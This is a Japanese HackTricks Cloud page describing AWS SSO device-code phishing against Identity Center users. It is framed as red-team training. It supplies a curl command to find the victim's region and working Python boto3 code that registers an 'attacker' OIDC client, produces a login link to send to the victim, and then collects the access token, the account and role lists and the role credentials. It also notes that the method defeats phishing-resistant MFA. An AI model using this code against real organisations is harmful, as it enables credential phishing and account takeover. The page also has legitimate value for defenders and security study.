# AWS - Identity Center & SSO Unauthenticated Enum

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスウェグ**](https://peass.creator-spring.com)を手に入れる
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**または[telegramグループ](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)を**フォロー**する
- **ハッキングトリックを共有するために、[HackTricks](https://github.com/carlospolop/hacktricks)と[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する**

</details>

## AWSデバイスコードフィッシング

最初に[**このブログ投稿**](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/)で提案された方法で、AWS SSOを使用して**ユーザーにリンクを送信**することで、**ユーザーが承認すると**、攻撃者は**ユーザーをなりすましてアクセス**し、ユーザーが**Identity Center**でアクセスできるすべてのロールにアクセスできるトークンを取得できます。

この攻撃を実行するために必要なものは次のとおりです：

- 犠牲者は**Identity Center**を使用する必要があります
- 攻撃者は、犠牲者が使用している**サブドメイン** `<victimsub>.awsapps.com/start` を知っている必要があります

前述の情報だけで、**攻撃者はユーザーにリンクを送信**し、**承認されると**、**攻撃者はAWSユーザーアカウントにアクセス**できるようになります。

### 攻撃

1. **サブドメインを見つける**

攻撃者の最初のステップは、被害者企業がIdentity Centerで使用しているサブドメインを見つけることです。これは、**OSINT**または**推測+BF**を使用して行うことができます。ほとんどの企業はここで自社名またはそのバリエーションを使用している可能性が高いためです。

この情報を使用すると、Identity Centerが構成された地域を取得できます：
```bash
curl https://victim.awsapps.com/start/ -s | grep -Eo '"region":"[a-z0-9\-]+"'
"region":"us-east-1
```
2. **被害者用のリンクを生成して送信する**

以下のコードを実行して、被害者が認証できるAWS SSOログインリンクを生成します。\
デモ用に、このコードをPythonコンソールで実行し、後でトークンを取得するためにいくつかのオブジェクトが必要になるため、コンソールを終了しないでください：
```python
import boto3

REGION = 'us-east-1' # CHANGE THIS
AWS_SSO_START_URL = 'https://victim.awsapps.com/start' # CHANGE THIS

sso_oidc = boto3.client('sso-oidc', region_name=REGION)
client = sso_oidc.register_client(
clientName = 'attacker',
clientType = 'public'
)

client_id = client.get('clientId')
client_secret = client.get('clientSecret')
authz = sso_oidc.start_device_authorization(
clientId=client_id,
clientSecret=client_secret,
startUrl=AWS_SSO_START_URL
)

url = authz.get('verificationUriComplete')
deviceCode = authz.get('deviceCode')
print("Give this URL to the victim: " + url)
```
3. **被害者がそれを受け入れるのを待つ**

被害者が**すでにAWSにログインしている**場合、権限を付与することを受け入れるだけで済みます。ログインしていない場合は、**ログインしてから権限を付与する必要があります**。\
これが現在のプロンプトの見た目です：

<figure><img src="../../../.gitbook/assets/image (154).png" alt="" width="311"><figcaption></figcaption></figure>

4. **SSOアクセストークンを取得する**

被害者がプロンプトを受け入れた場合、次のコードを実行して**ユーザーをなりすましてSSOトークンを生成**します：
```python
token_response = sso_oidc.create_token(
clientId=client_id,
clientSecret=client_secret,
grantType="urn:ietf:params:oauth:grant-type:device_code",
deviceCode=deviceCode
)
sso_token = token_response.get('accessToken')
```
SSOアクセストークンは**8時間有効**です。

5. **ユーザーを偽装する**
```python
sso_client = boto3.client('sso', region_name=REGION)

# List accounts where the user has access
aws_accounts_response = sso_client.list_accounts(
accessToken=sso_token,
maxResults=100
)
aws_accounts_response.get('accountList', [])

# Get roles inside an account
roles_response = sso_client.list_account_roles(
accessToken=sso_token,
accountId=<account_id>
)
roles_response.get('roleList', [])

# Get credentials over a role

sts_creds = sso_client.get_role_credentials(
accessToken=sso_token,
roleName=<role_name>,
accountId=<account_id>
)
sts_creds.get('roleCredentials')
```
### Phishing the unphisable MFA

前の攻撃が「unphisable MFA」（webAuthを使用している場合でも）機能することを知るのは楽しいです。これは、前のワークフローが使用されるOAuthドメインを離れないためです。他のフィッシング攻撃とは異なり、ユーザーがログインドメインを置き換える必要がある場合がありますが、この場合、デバイスコードワークフローが準備されているため、コードがデバイスによって知られており、ユーザーは異なるマシンでもログインできます。プロンプトが受け入れられると、デバイスは単に最初のコードを知っているだけで、ユーザーの資格情報を取得できます。

詳細については、[**この投稿をチェックしてください**](https://mjg59.dreamwidth.org/62175.html)。

### Automatic Tools

* [https://github.com/christophetd/aws-sso-device-code-authentication](https://github.com/christophetd/aws-sso-device-code-authentication)
* [https://github.com/sebastian-mora/awsssome\_phish](https://github.com/sebastian-mora/awsssome\_phish)

## References

* [https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/)
* [https://ruse.tech/blogs/aws-sso-phishing](https://ruse.tech/blogs/aws-sso-phishing)
* [https://mjg59.dreamwidth.org/62175.html](https://mjg59.dreamwidth.org/62175.html)
* [https://ramimac.me/aws-device-auth](https://ramimac.me/aws-device-auth)

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）でAWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>こちらをチェック！</strong></a><strong>!</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksをPDFでダウンロード**したり、**HackTricksを広告する**ことができる場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加**したり、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)をフォローする
* ハッキングトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する

</details>
